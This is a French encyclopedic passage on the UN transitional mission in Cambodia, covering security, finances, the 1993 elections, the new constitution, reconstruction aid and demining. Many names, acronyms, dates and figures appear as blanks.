Concernant la sécurité publique, la police civile internationale devait étroitement collaborer avec les services chargés de superviser le respect des droits de l’homme, les élections, le rapatriement des réfugiés ainsi que les administrations civiles et militaires. La présence policière était destinée à montrer aux Cambodgiens la détermination de l’ à faire respecter le processus de paix et créer un environnement politique neutre où les abus de pouvoir et l’arbitraire ne seraient pas tolérés. La majeure partie du travail quotidien des de la police civile internationale consisterait dans la supervision des activités de police et la formation du personnel local notamment sur le rôle de l’, le contrôle des trafics, le respect des droits de l’homme, les enquêtes criminelles, la prévention des délits et des émeutes.
En outre, les tâches dévolues comprenaient aussi la formation des juges, procureurs et officiers de police de l’administration existante pour les conformer au nouveau code pénal adopté par le ainsi que des visites régulières des prisons. Des groupes mobiles devaient aussi être mis en place pour assurer la sécurité sur les routes et combattre le brigandage alors en pleine croissance. Le représentant spécial publiait de son côté une directive règlementant la détention et le port d’armes et d’explosifs.
En décembre, un problème devint critique. L’incapacité de l’ à accéder aux structures administratives du entraina un durcissement des positions du gouvernement de Phnom Penh dirigé par Hun Sen quant à la supervision de son administration. Cette réticence, dont des prémices apparurent dès octobre, devint particulièrement évidente avec la détérioration de la situation militaire et s’appliqua à tous les domaines de vérification alloués à la communauté internationale. Ainsi, à partir de novembre, une recrudescence d’incidents violents tels des attaques contre des bureaux de partis politiques ou de leur personnel, contre des personnes d’origine vietnamiennes et enfin des crimes sans motivations politiques évidentes renforcèrent le sentiment d’insécurité au sein de la population.
Les actes de violences et d’intimidation avaient repris de plus belle avant la fin de l’hiver, notamment ceux contre les Cambodgiens d’origine vietnamienne qui étaient encouragés par les messages de la radio khmère rouge et certains journaux de Phnom Penh. Le , des unités du attaquaient un village flottant de la province de Siem Reap, tuant 33 personnes, dont 12 enfants, et en blessant 24.
Le , des assaillants attaquaient des bateaux de pêche dans la province de Kampong Chhnang, faisant 8 morts, dont 3 enfants. Enfin, le à Phnom Penh, des attaques coordonnées à la grenade sur quatre locaux occupés ou appartenant à des personnes d’ascendance vietnamienne firent 2 morts et au moins 20 blessés. La plupart des meurtres semblaient avoir des mobiles politiques ou ethniques, mais certains assassinats n’avaient pas de motivations apparentes et intervenaient dans un environnement où, après des années de guerre, il y avait profusion d’armes. Les forces internationales ayant refusé de les protéger, plusieurs milliers de membres de la communauté vietnamienne du Cambodge, en réaction à ces séries d’attaques, décidèrent de retourner dans leur pays d’origine, la plupart par bateau. Du 21 mars au 28 avril les points de contrôle sur la frontière gérés par l’ en dénombrèrent . De leur côté, les troupes internationales surveillèrent de près ces mouvements et s’assurèrent que les autorités locales protégeaient ces migrants.
Durant sa visite au Cambodge, le secrétaire général lança un appel urgent pour que cesse la violence. Le prince Sihanouk lui emboita le pas et demanda à ses compatriotes de refréner leurs actes de violence à l’encontre de l’. Sa déclaration fut approuvée par le gouvernement de Phnom Penh, le et le .
Malgré des indications préliminaires laissant penser à un déclin relatif des violences au début d’avril, celles-ci continuèrent. Dans beaucoup de cas, il s’agissait d’attaques menées par des groupes inconnus ou proches du contre des fonctionnaires du gouvernement ou d’autres contre les membres des autres partis mené par des auteurs qui, quand ils pouvaient être identifiés, s’avéraient avoir des accointances avec les autorités de Phnom Penh. En avril, des attaques contre le personnel international eurent aussi lieu, faisant 7 morts et 15 blessés. La mort d’un volontaire japonais de l’ et de son interprète cambodgien marqua les esprits. À Kampong Spoe, 4 militaires bulgares furent tués et 9 autres blessés dans trois incidents différents.
Début mai, des véhicules de l’ furent attaqués à Kampong Cham et Banteay Mean Chey, blessant 15 militaires et policiers et tuant un observateur civil japonais. Le , une attaque du contre un poste de police rate sa cible et endommage le local d’une compagnie d’ingénierie chinoise.
Le conseil de sécurité, par la résolution 826 du , condamnait tous les actes de violences commis pour des raisons politiques ou ethniques, ainsi que contre le personnel international. Dans le même temps, le conseil réaffirmait à toutes les parties cambodgiennes la nécessité de coopérer avec l’.
Cette condamnation sera malheureusement sans effet, et le Cambodge connaîtra encore des problèmes de sécurité pendant de nombreuses années.
Finances.
Dans le domaine des finances, l’ devait travailler avec les administrations existantes pour mettre en place des processus de contrôle des dépenses, des sources de revenus, du fonctionnement de la banque centrale et préparer la privatisation des biens publics. Le adoptait une directive du représentant spécial sur le transfert dans le privé de certains actifs de l’État afin d’introduire une transparence dans les transactions. L’ devait aussi tenter de stabiliser l’économie du pays pour réduire les risques de troubles à même de saper l’environnement électoral. Des équipes de contrôle supplémentaires avaient été créées en plus de celles de supervision des structures gouvernementales, en particulier, en dehors de Phnom Penh. Chaque équipe était dirigée par un inspecteur assisté d’un conseiller aux finances et d’un autre à la sécurité publique représentant des composantes de police civile et militaire. Enfin, elle était composée d’analystes et d’interprètes chargés de travailler dans le domaine de l’éducation et de l’information.
Après les élections, le rôle de l’ se limita à favoriser une transition en douceur des structures administratives existantes vers le nouveau gouvernement. Au niveau provincial, alors que les contacts avec les fonctionnaires furent maintenus, le dialogue et l’esprit de réconciliation national étaient encouragés. Concernant les biens nationaux, toutes les ventes, transferts ou autres arrangements furent règlementés. D’une manière générale, les contrôles financiers furent maintenus pendant la période transitoire, aussi bien au niveau régional que national.
Ces contrôles s’avéreront toutefois peu efficaces et même un rapport émanant du Ministère français de la Défense reconnaissait que la .
Élections.
La mise en place.
À la fin de 1991 une unité d’organisation des élections fut créée et était chargée de recueillir des données sociodémographiques et cartographiques afin de préparer le scrutin. Cette unité sera par la suite intégrée au personnel électoral de l’. Le reste de ce personnel sera progressivement déployé à travers le pays. En coopération avec le , l’ devait établir un système de lois, de procédure et de mesures nécessaires à l’organisation d’élections libres et équitables au Cambodge. Elle devait aussi mettre en œuvre un code de conduite permettant de participer tout en respectant les droits de l'homme et en empêchant les pratiques de coercition ou de financement occultes destinés à influencer le choix des électeurs. Les lois existantes qui allaient à l’encontre des accords devaient être abrogées. Un système pour enregistrer les votants et les partis en lice devait être mis en place, ainsi qu’un processus permettant de garantir un vote libre et équitable. Enfin, il fallait aussi permettre la présence d’observateurs internationaux pour garantir la régularité des élections.
L’ devait également gérer les plaintes pour irrégularités, mettre en place les actions correctives et publier les résultats. L’intégralité du processus ne devait pas dépasser 9 mois ; il nécessitait 198 agents internationaux qui devaient opérer dans les quartiers généraux et les centres municipaux et provinciaux ainsi que quelque 400 volontaires des Nations unies dans chacun des 200 districts. Ils seront secondés par environ Cambodgiens durant l’inscription sur les listes électorales et, pendant les élections, par superviseurs internationaux et agents cambodgiens répartis dans . Pour améliorer l’efficacité et diminuer les coûts, les opérations étaient informatisées. Le secrétaire général des Nations unies recommandait que les inscriptions des votants commencent en et durent trois mois. Cette période pouvait être étendue si son représentant spécial le jugeait nécessaire. Près de 60 % des effectifs de la police internationale furent ainsi directement impliqués dans le processus d’inscription sur les listes électorales.
Pendant la campagne, l’accroissement des attaques contre les bureaux des partis politiques amena les troupes de l’ à intensifier les patrouilles et les gardes pour réfréner les agressions. Elles surveillaient aussi les meetings, les rassemblements et les bureaux de vote. Les élections étaient programmées pour fin avril ou début .
Les inscriptions sur les listes.
Un projet de loi électorale fut présenté le au et fit l’objet d’une série de consultations. Malgré les réserves du , la loi fut adoptée le , et promulguée le 12. Elle différait quelque peu du projet initial. Tout d’abord, afin de restreindre le droit de vote aux seuls Cambodgiens, l’inscription sur les listes se limitait aux personnes nées au Cambodge ayant au moins un des deux parents également nés sur place ainsi qu’à ceux ayant vu le jour à l’étranger mais ayant au moins le père ou la mère qui répond à la condition précédente. Ces restrictions, allaient être à la source de certaines difficultés quand on s’aperçut que si elles permettaient aux personnes d’origine vietnamienne ayant eu au moins un grand-parent né au Cambodge de participer, elles excluaient les "Khmers Krom" nés au Viêt Nam. Le second amendement permettait aux Cambodgiens de la diaspora de voter en ouvrant trois bureaux outre-mer, un en Europe, un en Amérique du Nord et enfin un en Australie.
Toutefois, l’enregistrement se ferait exclusivement au Cambodge. De plus, comme précisé dans les accords, les 120 membres de l’assemblée constituante seraient choisis sur la base d’un scrutin proportionnel par province, mais étant donné qu’aucune donnée démographique n’existait concernant la disposition et l’importance de l’électorat, la répartition des sièges allait dépendre des inscriptions.
Tout Cambodgien d’au moins 18 ans était éligible et pouvait participer au vote qui devait permettre de choisir un parti préalablement enregistré par l’ pour avoir le droit de participer. Enfin, la liste des candidats de chaque parti serait publiée dans chaque province avant les élections.
Le représentant spécial promulgua un nombre de révisions mineures à la loi électorale pour répondre à des problèmes, notamment de sécurité. L’enregistrement des millions de votants, qui avait débuté le préalablement pour trois mois et qui finalement dura jusqu’au , fut supervisé par des représentants des partis politiques qui avaient le droit de contester des scrutateurs. Les listes furent entrées dans les ordinateurs de l’, prévus pour consigner jusqu’à millions de votants.
Il n’était toutefois pas possible d’accéder aux zones contrôlées par le , dont on estimait qu’elle comprenait 5 % de la population du pays. Le , débuta l’inscription des partis. Le secrétaire général restait convaincu que le processus électoral pourrait se dérouler dans les temps prévus.
À la demande des partis cambodgiens et du prince Sihanouk, l’ étudia également un projet d’organiser une élection présidentielle. Bien qu’un tel scrutin ne fût pas prévu par les accords de Paris, il reçut un accueil favorable .
Les inscriptions sur les listes électorales commencèrent à Phnom Penh le , le 19 dans quatre autres provinces et progressivement dans les suivantes. Le personnel affecté à cette tâche comprenait notamment près de 280 Cambodgiens chargés de collecter les données et travaillant en 3 × 8. Après quelques semaines, on comptait déjà près d’un million d’inscrits.
Toutefois, les différends avec le s’accumulaient, et le , lors d’une réunion à Pékin, les partisans de Pol Pot indiquaient leur intention de ne pas prendre part au processus électoral tant que les conditions de neutralité politique n’étaient pas réunies. Ces circonstances firent que le retrait des forces internationales initialement prévu fut ajourné et les militaires furent redéployés afin de garantir la sécurité des populations et d’assurer la protection des inscriptions sur les listes, particulièrement dans les zones reculées et non sécurisées.
De son côté, la radio de l’ débuta ses émissions le , avec des programmes qui couvraient principalement l’enregistrement sur les listes et le processus électoral.
Le 30, novembre par la résolution 792, le conseil de sécurité confirmait que les élections à l’Assemblée constituante cambodgienne devraient se dérouler au plus tard en mai 1993 et prenait note des propositions du secrétaire général pour l’organisation d’une élection présidentielle. Il condamnait le pour ne pas avoir tenu les promesses faites lors de la signature des accords de Paris et lui demandait, entre autres, de se conformer immédiatement à ses obligations, de faciliter le déploiement des forces de l’ dans les zones sous son contrôle, et de ne pas entraver l’inscription sur les listes électorales dans ce secteur. Le conseil détermina que les troupes internationales devraient préparer les élections dans les zones auxquelles elles auraient accès au . Il demandait au secrétaire général d’évaluer les conséquences du refus de coopérer du sur le déroulement du processus électoral.
Le , le représentant spécial annonçait que la fin de la période d’enregistrement sur les listes électorales était repoussée au . Le , le prince Sihanouk a confirmé au représentant spécial qu’il serait prêt à se présenter à une éventuelle élection présidentielle.
Mais, lors de la réunion du le , il annonçait sa décision de ne pas présenter sa candidature pour le moment. Au contraire, il désirait attendre que la nouvelle constitution soit adoptée et que le président puisse être élu suivant les modalités définies par la nouvelle règlementation qui en découlerait. Lors de cette réunion du 28 janvier, les dates des élections à l’assemblée constituante furent fixées du 23 au . Ces dates seront pas la suite étendues, pour permettre le vote dans les bureaux mobiles les 27 et .
Lors de la clôture des listes, plus de millions de personnes s’étaient inscrites, soit près de 96 % de la population en âge de voter. En janvier, alors que les listes allaient bientôt être closes, il fut décidé que les réfugiés pouvaient se faire enregistrer depuis les camps en Thaïlande et recevoir leurs cartes lors de leur retour au Cambodge.
Toutefois, les menaces étaient montées d’un cran. Ainsi, en janvier, deux femmes cambodgiennes, membres de l’équipe d’enregistrement des votants succomberont à une attaque sur un village de la province de Siem Reap. On ne sait si cette agression était l’œuvre du ou de sympathisants du , réagissant à l’emprisonnement d’un des leurs, soupçonné d’avoir attaqué un bureau du et à la demande de limogeage du gouverneur de la province accusé de laisser se développer les brutalités, arrestations arbitraires et autres mesures d’intimidation à l’encontre de l’opposition.
Le , 20 des 22 partis prévus s’étaient conformés à la loi électorale en présentant une liste de 500 membres inscrits comme futurs votants. Ni le ni son parti politique, le Parti de l’Unité Nationale Cambodgienne, fondé en novembre 1992, n’avaient rempli leurs obligations pour se présenter aux élections. Ces 20 partis représentaient un ensemble de candidats, dont 240 pour le et le et 238 pour le .
La campagne.
Le , à une réunion du , l’ annonçait que la campagne électorale débuterait le et s’achèverait le soit quatre jours avant le début des votes. Durant la campagne, l’ mettrait tous ses moyens de diffusion et d’information à la disposition de tous les partis politiques en vue de garantir un accès équitable aux médias.
Le , le conseil de sécurité, par la résolution 810, se félicitait du résultat des inscriptions et demandait à l’ de poursuivre ses efforts pour maintenir un environnement politique neutre propice au déroulement d’élections libres.
Le , le représentant spécial rencontrait les responsables des 20 partis pour les informer de leurs droits et de leurs devoirs vis-à-vis de la loi électorale en tant que dirigeants politiques.
Le , le annonçait officiellement au sa décision de ne pas participer au processus électoral, prétextant que les forces vietnamiennes continuaient à occuper le Cambodge et que l’environnement politique n’était toujours pas neutre.
Les 465 volontaires de l’ qui faisaient office d’observateurs, souvent dans des zones reculées et parfois peu sûres, jouaient un rôle important dans le programme d’éducation civique et pour convaincre les futurs électeurs que leurs votes seraient bien secrets, contrairement aux allégations de certains partis politiques. Dans leurs attributions figuraient aussi la formation du personnel électoral. Toutefois, après un incident le dans lequel un superviseur fut tué, l’ mit en place des mesures préventives pour améliorer la sécurité. On demandait aux volontaires présents dans des zones considérées à risques de quitter les campagnes et de ne pas sortir sans une escorte armée jusqu’à nouvel ordre.
La campagne électorale débuta officiellement le ; les 20 partis participèrent activement et ouvrirent des bureaux dans la majeure partie du pays. Le inauguraient 762 permanences, le 204, tous deux répartis dans les 21 provinces, le PLD (Parti Libéral Démocratique, né d’une scission au sein du ) 146 dans 20 provinces, le MOLINAKA (royaliste indépendant du ) 57 dans 15 provinces, le Parti démocratique 56 dans 19 provinces et le reste des partis, 163 bureaux. Les observateurs se disséminèrent sur l’ensemble du pays, afin d’aider les agents électoraux dans leur campagne d’éducation civique. Après coup, des déserteurs khmers rouges affirmèrent que ce déploiement de force était la principale raison pour laquelle leurs dirigeants renoncèrent à saboter le scrutin .
Durant sa seconde visite au Cambodge les 7 et 8 avril, le secrétaire général déclara au qu’il pensait que les conditions minimales et acceptables pour la tenue de la campagne étaient réunies. Il se basait notamment sur le fait qu’elle était menée de manière pacifique par des dizaines de milliers de Cambodgiens. Toutefois, l’ensemble des unités militaires de l’ recevaient dans le même temps l’ordre d’accroitre leur vigilance, d’améliorer les mesures visant à assurer la sécurité du processus électoral et de protéger des conditions d’instabilité les représentants des partis cambodgiens ainsi que le personnel international.
Il fut aussi décidé que durant les élections, aucun vote n’aurait lieu dans les zones contrôlées par le pour lesquelles l’ n’avait pas été autorisée à accéder, ni dans celles où des escouades khmères rouges opéraient. Les autres parties du pays étaient classés comme zones à haut, moyen ou faible risque. Des mesures de sécurité appropriées furent établies en fonction du niveau de danger. Dans les zones à haut risque, des militaires armés devaient stationner dans et autour des bureaux de vote, du matériel de protection était distribué au personnel international et des forces d’intervention rapide ainsi que des équipes médicales d’urgence furent déployées. En réponse aux menaces grandissantes dans certaines provinces, le personnel civil de l’ fut retiré et à certains endroits, le nombre de bureaux fut réduit. Enfin, la sécurité fut renforcée dans les agences des organismes internationaux.
Le , lors d’une réunion du , le représentant spécial déclarait qu’à son avis, la liberté et l’équité des élections dépendrait surtout de trois facteurs : la mesure dans laquelle la campagne et le vote seraient perturbés par la violence et les intimidations ; comment le gouvernement de Phnom Penh, qui contrôlait la plus grande zone et avait la structure administrative la mieux implantée, profiterait indument de cette situation ; enfin l’organisation technique des élections.
L’ avait abordé à maintes reprises, autant en public qu’en privé, avec les autorités de Phnom Penh la nécessité de séparer les intérêts du pays de ceux du parti, notamment l’accès aux médias des autres formations politiques et leurs droits à une liberté de mouvement. En effet, des rapports convergeant indiquaient que l’appareil d’État était largement utilisé pour faire la promotion électorale du pouvoir en place et que les mesures d’intimidations et d’entrave envers les autres formations étaient loin d’être négligeables. Les élections restaient le point principal de la mission.
Le secrétaire général avait ainsi tenu à préciser dans son rapport du que .
Pendant la campagne électorale, du 7 avril au , quelque réunions et rassemblements politiques se tenaient quotidiennement et de manière pacifique, touchant près de dans tout le pays. L’ organisa de son côté des réunions auxquelles elle conviait plusieurs partis. Toutes les formations politiques avaient accès aux moyens de communication de l’. Ainsi, le dont l’avion avait été bloqué pour des raisons obscures par les autorités de Phnom Penh avait pu obtenir d’utiliser un aéroplane de l’organisation internationale pour les besoins de sa campagne. Il sera alors indiqué que l’expérience pourrait être reconduite avec tout parti dont la liberté de circulation serait entravée, ce qui sera le cas avec deux autres formations.
Dans les semaines précédant les élections, la violence renait et on compte 110 morts et 179 blessés. Le secrétaire général notait toutefois qu’il .
Le conseil de sécurité, par la résolution 826 du , avalisait ce point de vue et félicitait ceux qui malgré les intimidations participaient à la campagne électorale conformément aux accords de Paris. Il exprimait également sa satisfaction du fait que le scrutin puisse se dérouler aux dates prévues.
Le déroulement des élections et ses résultats.
Les votes eurent lieu du 23 au . Pour des raisons économiques, seul un bulletin était disponible, comportant les noms et les sigles des 20 partis en lice sur lequel les électeurs devaient cocher la formation de leur choix. Dans les trois premiers jours, environ bureaux fixes étaient disséminés à travers tout le pays, ainsi que quelque 200 équipes mobiles, pour les zones difficiles d’accès. Un fonctionnaire cambodgien présidait chacune des officines, secondé par un agent international.
À partir du 26 mai, quelques bureaux fixes furent reconvertis en mobile et opérèrent jusqu’au 28. Finalement, le ne mit pas ses menaces à exécutions et le scrutin se déroula sans incidents notoires ; de nombreux cadres khmers rouges du "Phnom Malay" vinrent même voter à Poipet.
Le décompte, opéré par l’ débuta le . À cette date, lors d’une réunion du , le représentant spécial déclara, au nom du secrétaire général des Nations unies, qu’il estimait que les élections avaient eu lieu d’une manière libre et équitable.
Un total de , soit 89,56 % des inscrits, ont participé au vote. Sur les exprimés au niveau national, le (Front uni national pour un Cambodge indépendant, neutre, pacifique, et coopératif) en recueillait , soit 45,47 %, devant le (Parti du peuple cambodgien) qui totalisait , soit 38,23 % ; le (Parti Libéral Démocratique Bouddhiste) devait se contenter de (3,81 %) et les 17 autres partis se partageaient le reste. Le nombre de sièges à l’assemblée constituante étaient de 58 pour le , 51 pour le , 10 pour le et 1 pour une quatrième formation politique, le (Mouvement pour la libération nationale du Kampuchéa) d’obédience royaliste.
En dépit du succès de ces élections et de la création de l’assemblée constituante, la période postélectorale ne fut pas exempte de remous. Malgré la satisfaction que le , avait affiché lors de la réunion du du 29 mai, concernant l’excellente tenue des élections, le parti au pouvoir fit état de nombreuses irrégularités dans le décompte des voix et demandait à l’ d’organiser de nouvelle élections à Phnom Penh et dans trois provinces.
Le conseil de sécurité, de son côté, par la résolution 835 du , appelait toutes les parties à honorer leurs engagements et à respecter les résultats.
Rendant compte le de la tenue et des résultats des élections lors d’une nouvelle réunion du , le secrétaire général informe le conseil que des quatre parties signataires des accords de Paris, seul le n’a pas pris part au scrutin et a menacé de le perturber par des actes violents. Mis à part quelques rares incidents, le vote s’était toutefois déroulé de manière pacifique et souvent dans une atmosphère festive, avec des électeurs qui parfois parcouraient des kilomètres sur des chemins difficiles pour mettre leurs bulletins dans l’urne, bravant les menaces contre leur sécurité et les moussons qui s’abattaient sur le pays.
Le , de son côté, qui contrôlait encore les administrations locales, et qui se targuait de disposer de 3 millions d’adhérents, annonçait qu’il ne pouvait pas reconnaitre les résultats des élections. Ses récriminations portaient sur quatre points principaux, à savoir le manque de neutralité des forces internationales qui auraient défavorisé le parti au pouvoir à Phnom Penh, des modifications de la loi électorale opérées sans en référer au , l’interdiction faite aux partis d’accéder aux lieux où étaient entreposés les bulletins et des irrégularités diverses allant d’urnes scellées mais vidées de leur contenu à des sceaux brisés et des divergences entre certains procès verbaux et le nombre de bulletins. Il demandait des enquêtes concernant les anomalies qu’il avait signalées.
L’ engagea d’âpres discussions à ce sujet, demandant au de fournir des détails pour étayer ces accusations. Toutes les données concrètes furent rapidement examinées. Le représentant spécial et ses associés contactèrent Chea Sim, le président du pour lui communiquer l’ensemble des mesures prises pour rectifier les anomalies dont ils avaient eu connaissance. L’ affirmait aussi on ne peut plus clairement que les irrégularités relevées ne pouvaient constituer des fraudes et qu’aucune des accusations du parti au pouvoir, même si elles devaient s’avérer fondées, ne remettrait en cause le résultat des élections.
Début juin, des fonctionnaires de l’État du Cambodge, emmenés par le prince Chakrapong, déclarèrent la sécession des six provinces orientales de Kampong Cham, Prey Veng, Mondol Kiri, Rotanah Kiri, Stoeng Treng et Svay Rieng .
La tension s’accroissait dans ces provinces et se caractérisait par des attaques contre le personnel et les propriétés de l’. Cela conduisit à retirer les 12 et 13 juin le personnel international civil qui n’était pas essentiel. Le représentant spécial demanda au prince Sihanouk de contacter les dirigeants du et du . Le , le prince lança un appel pour un règlement pacifique et une normalisation de la situation. Le représentant spécial, un temps réticent, encourageait lui aussi au dialogue entre les deux principaux partis. Le , Norodom Sihanouk proposait la formation d’un gouvernement national provisoire cambodgien (GNPC) coprésidé par le prince Ranariddh et Hun Sen.
Pendant ce temps, la position du s’était assouplie et les velléités de sécession s’étaient estompées. Le , les autorités de Phnom Penh publiaient une déclaration où elles reconnaitraient le résultat des élections quel que soit le dénouement des investigations sur les irrégularités. L’, de son côté, acceptait de créer un comité d’enquête pour gérer ce problème.
Finalement, le , le , le et le s’accordaient sur la formation d’un gouvernement provisoire et envoyèrent la liste des cabinets à l’assemblée constituante. Dans le même temps, le annonçait qu’ils pourraient eux aussi accepter le résultat des élections.
Le secrétaire général informait le conseil de sécurité que l’établissement du , bien que non prévu dans les accords de Paris, aboutissait à .
L’administration, qui devait fonctionner pendant la période transitoire, était une tentative de fusion de trois structures existantes, avec le prince Sihanouk à la tête de l’État. Toutefois, cette fusion n’était que relative et n’eut que peu de prolongement au niveau local, le conservant l’essentiel de ses positions de 1991 .
Néanmoins, des pourparlers entre le et les partis contribuant au nouveau gouvernement du pays permettaient d’espérer une réconciliation nationale globale. Après les élections, un personnel international réduit restait à Phnom Penh pour assister le comité consultatif électoral dans le traitement des plaintes déposées par le puis aider à mettre en place une assemblée constituante et une nouvelle constitution.
Constitution.
Par la résolution 840 du , le conseil de sécurité avalisait le résultat des élections de mai. Il exprimait aussi son soutien total aux 120 nouveaux élus de l’assemblée constituante qui devait rédiger une constitution et se transformer en assemblée législative chargée de nommer un nouveau gouvernement. Le conseil insistait sur la nécessité pour l’assemblée, de mener à bien sa mission dans les plus brefs délais et de ne pas dépasser les trois mois stipulés par les accords de Paris. Il demandait aussi à l’, de poursuivre son activité pendant la période de transition, en coopération avec le .
L’assemblée constituante débuta ses travaux le . Lors de la session inaugurale, une résolution fut adoptée qui replaçait le prince Sihanouk comme chef de l’État, rétroactivement à 1970, rendant sa déposition du nulle et non avenue. L’assemblée donnait aussi au prince les pouvoirs de chef de l’État.
Le , l’assemblée constituante élisait son président ainsi que ses deux vice-présidents et adoptait un code de conduite. Deux comités étaient également créés, un pour élaborer un projet de constitution et un autre pour définir des règles d’administration. À la demande des partis, l’ fournissait une assistance logistique et opérationnelle ainsi que des conseils techniques. L’assemblée bénéficia également d’un vote de confiance, le .
Le , l’assemblée constituante adoptait la nouvelle constitution par 113 voix pour, 5 contre et 2 abstentions. Elle était le fruit d’un compromis entre les deux partis dominants.
La monarchie était rétablie et le roi est choisi par un conseil du trône parmi les descendants des rois Norodom ou Sisowath. Comme dans la plupart des monarchies constitutionnelles, il règne mais ne gouverne pas. Le Premier ministre, nommé par le monarque, dirige le gouvernement et est responsable devant l’Assemblée nationale élue pour cinq ans. Si l’économie est libérale, les marchés demeurent sous le contrôle de l’État et les libertés publiques restent limitées par la loi. Enfin, pour éviter que ne se reproduise la crise qui avait suivi les élections, il fut défini que le gouvernement devait obtenir l’aval de 66 % des membres de l’Assemblée nationale.
La constitution est officiellement promulguée le . Le jour même, le conseil du Trône élisait le prince Sihanouk roi du Cambodge. En conformité avec les accords de Paris et cette nouvelle constitution, l’assemblée constituante devint législative. Le nouveau roi nomma son fils, le prince Norodom Ranariddh, chef du , premier Premier ministre du nouveau gouvernement et Hun Sen, dirigeant du , second Premier ministre.
Cet acte marquait la fin de la mission de l’ qui à cette date avait déjà commencé le retrait de son personnel et dont les derniers membres – appartenant au service médical – quittèrent le Cambodge le .
Reconstruction.
Sans développement du pays, le régime mis en place avec l’aide de l’ ne pouvait pas être viable. Dès la signature des accords de Paris, une déclaration sur le relèvement et la reconstruction du Cambodge avait été signée, qui stipulait que . Dans le but d’harmoniser et gérer les contributions qui en découleraient, il avait été suggéré de créer un comité international pour la reconstruction du Cambodge sous l’égide des Nations unies.
Gestion de l’aide internationale.
Un directeur chargé de répertorier les besoins et de coordonner les différentes activités avait été nommé par le secrétaire général et devait rendre compte au représentant spécial. Ce directeur était chargé d’attribuer les ressources en fonction des contributions de l’aide internationale.
Pendant sa visite au Cambodge, du 18 au , Boutros Boutros-Ghali lança un appel à la communauté internationale pour fournir 593 millions de dollars afin de financer l’effort de reconstruction. Une conférence ministérielle sur la réhabilitation et la reconstruction du Cambodge se tint à Tokyo du 20 au , à laquelle participaient 33 pays (Allemagne, Australie, Autriche, Belgique, Brunei, Cambodge, Canada, Chine, Corée, Danemark, Espagne, États-Unis, Finlande, France, Inde, Indonésie, Irlande, Italie, Japon, Laos, Malaisie, Norvège, Nouvelle-Zélande, Pays-Bas, Philippines, Portugal, Royaume-Uni, Russie, Singapour, Suède, Suisse, Thaïlande et Viêt Nam), plusieurs organisations intergouvernementales telles l’Union européenne et de nombreux programmes des Nations unies. La conférence déboucha sur deux déclarations adoptées à l’unanimité. Une concernait le processus de paix et l’autre la réhabilitation du Cambodge. Dans la seconde, les participants s’étaient mis d’accord pour créer un comité international pour la reconstruction du Cambodge. Sous la présidence du Japon, il était chargé de coordonner à moyen et long terme les efforts de réhabilitation de la communauté internationale. Enfin, les promesses de dons d’aide au Cambodge s’élevaient à 800 millions de dollars, dépassant largement les 593 millions demandés.
Toutefois, au début de 1993, le secrétaire général rapportait que seuls 95 millions de dollars avaient été en fait déboursés. De plus, l’absence de fonds dans certains secteurs spécifiques, dont la formation et le maintien de certains services sociaux cruciaux, risquait de compromettre l’ensemble de l’effort de réhabilitation. Ces problèmes furent discutés lors d’une réunion des donateurs à Phnom Penh, le . Les participants reconnurent la nécessité d’accélérer le paiement des sommes promises à Tokyo. Ils révisèrent les priorités des besoins et convinrent de réunir après les élections le comité international de reconstruction du Cambodge. À la mi-août 1993, environ 200 millions avaient été payés. Une nouvelle réunion eu lieu à Paris les 8 et où de nouvelles promesses se montant à 120 millions furent faites. Dans le même temps, en juin 1993, après les élections et alors que débutait le retrait des forces de l’, le secrétaire général déclarait que le Cambodge nécessitait une aide et une assistance internationale continue. Le pays faisait toujours face à d’énormes problèmes de sécurité, de stabilité ; il devait en outre améliorer ses moyens de déminage et assurer son développement économique et social.
La future aide devait se situer hors du cadre de l’ qui était une opération au mandat, à la durée et aux ressources clairement définis. Afin de coordonner l’ensemble des activités civiles assignées à diverses agences de l’, telles que la poursuite du développement, l’aide humanitaire et la promotion du respect des droits de l’homme au Cambodge, le secrétaire général réitérait son intention d’installer à Phnom Penh un bureau permanent pour un représentant des Nations unies. Le bureau aurait aussi à traiter plusieurs problèmes persistants issus des accords de Paris et de la présence de l’ dans le pays. Le secrétaire général ne recommandait pas, à ce stade, de maintenir la force militaire internationale mais de reconsidérer la question si une demande en ce sens émanait du nouveau gouvernement.
Si, par la résolution 860 du le conseil de sécurité approuvait le plan de retrait et notamment que celui-ci devrait prendre fin au plus tard le , il prolongeait, par la résolution 880 du , la fin de la période de formation au déminage jusqu’au et le retrait des derniers éléments des composantes médicales et de la police militaire au .
Déminage.
Si, malgré les nombreux rapports d’ sur la situation dans le pays, la mission de déminage avait été occultée lors de la signature des accords de Paris, le besoin d’instruire le personnel cambodgien et de procéder aux premiers travaux devient rapidement impérieux. En effet, lors des deux décennies de guerres civiles, les différents belligérants avaient disséminé des mines anti-personnel à travers tout le pays ; leur nombre était évalué à plusieurs millions ; elles avaient déjà fait près de amputés et compromettaient la sécurité des campagnes. L’ a donc dû reprendre à son compte le programme de sensibilisation et d’assistance au déminage initié par la . Il fallut toutefois attendre 8 longs mois avant que le ne crée, le , le Centre d'action de déminage du Cambodge (CMAC en anglais) sous la présidence du prince Sihanouk et la vice-présidence de l’envoyé spécial du secrétaire général de l’. Chacun nommait cinq membres d’un comité directeur chargé de définir les politiques de sensibilisation, de délimiter les zones à risque et d’éliminer les mines.
Au même moment, à la fin , six équipes internationales de formation au déminage étaient opérationnelles et quatre autres groupes étaient prêts à commencer leur travail. Ces unités comprenaient alors près de 183 membres et étaient réparties entre les équipes de formations et celles de contrôle des interventions. Elles devaient enfin s’assurer que le serait opérationnel lors du retrait. Il était prévu d’instruire près de Cambodgiens à la détection et à la destruction des mines avant la fin de l’année, beaucoup provenant des soldats à démobiliser dans les troupes des quatre composantes du . Ces nouvelles compétences devaient contribuer à la réhabilitation du pays et à créer des emplois.
La première réunion du comité directeur du se tint le . En août 1993, un peu plus de de territoire avaient été nettoyés ; mines et autres engins non explosés avaient été détruits alors que quelque Cambodgiens avaient été formés. On restait toutefois loin des de terre de première nécessité que le Comité International pour la Reconstruction du Cambodge avait estimé urgent de déminer.
En novembre 1993, au départ de l’, le déminage restait une entrave importante au développement du pays et le restera pendant des années : alors qu’en 2000 les mines ont fait , il faudra attendre 2005, où leur nombre sera encore de plus de 800 pour voir une accalmie et enregistrer une baisse significative dans les années qui suivent, avec 450 en 2006, 351 en 2007, 271 en 2008 …
Remise en état des infrastructures.
